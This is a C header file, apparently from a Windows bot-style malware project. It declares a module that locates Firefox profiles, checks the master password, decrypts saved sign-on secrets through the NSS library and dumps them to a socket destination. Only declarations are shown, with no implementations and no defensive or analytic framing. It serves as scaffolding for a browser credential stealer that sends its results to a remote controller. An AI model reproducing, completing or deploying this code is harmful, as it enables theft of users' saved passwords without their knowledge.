    

 #ifndef NO_FIREFOX 


// Internal structure declaration taken from firefox..... 
typedef enum SECItemType 
{ 
    siBuffer = 0, 
    siClearDataBuffer = 1, 
    siCipherDataBuffer = 2, 
    siDERCertBuffer = 3, 
    siEncodedCertBuffer = 4, 
    siDERNameBuffer = 5, 
    siEncodedNameBuffer = 6, 
    siAsciiNameString = 7, 
    siAsciiString = 8, 
    siDEROID = 9, 
    siUnsignedInteger = 10, 
    siUTCTime = 11, 
    siGeneralizedTime = 12 
}; 


struct SECItem 
{ 
    SECItemType type; 
    unsigned char *data; 
    unsigned int len; 
}; 


typedef enum SECStatus 
{ 
    SECWouldBlock = -2, 
    SECFailure = -1, 
    SECSuccess = 0 
}; 

//ADDED: FIREFOX 
typedef struct FIREFOX 
{ 
   SOCKET sock; 
   char *dest; 
   int version; 
   int threadnum; 
   BOOL notice; 
   BOOL gotinfo; 

} FIREFOX; 


// For some PR type varialbes...just to remove gecko-sdk dependency 
// following is added here. 
#define PRBool   int 
#define PRUint32 unsigned int 
#define PR_TRUE  1 
#define PR_FALSE 0 

#define Unichar           unsigned int 
#define HEADER_VERSION1    "#2c" 
#define HEADER_VERSION2    "#2d" 
#define CRYPT_PREFIX      "~" 

DWORD WINAPI FindFirefoxPasses(LPVOID param); 
//int FindFirefoxPasses(SOCKET sock, char *dest, BOOL notice); 
char *GetCurrentUserProfilePath(); 
char *GetFirefoxLibPath(); 
int InitializeFirefoxLibrary(char *firefoxPath); 
int InitializeNSSLibrary(char *profilePath, char *password); 
//void DumpSignonSecrets(char *profilePath); 
void DumpSignonSecrets(char *profilePath, SOCKET sock, char *dest, BOOL notice); 
void TerminateFirefoxLibrary(); 
HMODULE LoadLibrary2(char *firefoxDir, char *libName); 
int CheckMasterPassword(char *password); 
int OpenFile2(char *filePath); 
void CloseFile(); 
int ReadLine(char *buffer, int size); 
char ReadChar(); 
int DecryptSecretString(char *cryptData, char **clearData); 
int Base64Decode(char *cryptData, char **decodeData, int *decodeLen); 
int PK11Decrypt(char *decodeData, int decodeLen, char **clearData, int *finalLen); 
void StrLwr(char *str); 

#endif 

